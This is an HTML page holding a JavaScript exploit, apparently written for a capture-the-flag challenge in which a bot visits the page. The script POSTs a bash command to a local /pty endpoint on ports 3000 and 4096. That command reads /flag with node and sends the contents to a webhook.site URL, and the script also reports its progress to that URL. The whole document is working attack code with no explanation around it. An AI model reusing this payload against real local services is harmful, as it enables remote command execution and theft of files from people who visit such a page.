<!DOCTYPE html>
<html>
<body>
    <script>
        const WEBHOOK = 'https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4';
        
        // 1. 调试信号：确认 Bot 已经访问了页面
        fetch(`${WEBHOOK}?status=bot_arrived`);

        async function exploit(port) {
            const url = `http://127.0.0.1:${port}/pty`;
            // 命令：读取 flag 并通过 fetch 发出
            const cmd = `node -e "fetch('${WEBHOOK}?port=${port}&flag=' + encodeURIComponent(require('fs').readFileSync('/flag', 'utf8')))"`;

            try {
                // 使用 no-cors 模式，虽然无法获取响应，但请求能发出去
                await fetch(url, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        command: '/bin/bash',
                        args: ['-c', cmd]
                    })
                });
                fetch(`${WEBHOOK}?status=sent_to_${port}`);
            } catch (e) {
                fetch(`${WEBHOOK}?status=error_${port}_${e.message}`);
            }
        }

        // 尝试常见的两个端口
        exploit(3000);
        exploit(4096);
    </script>
</body>
</html>
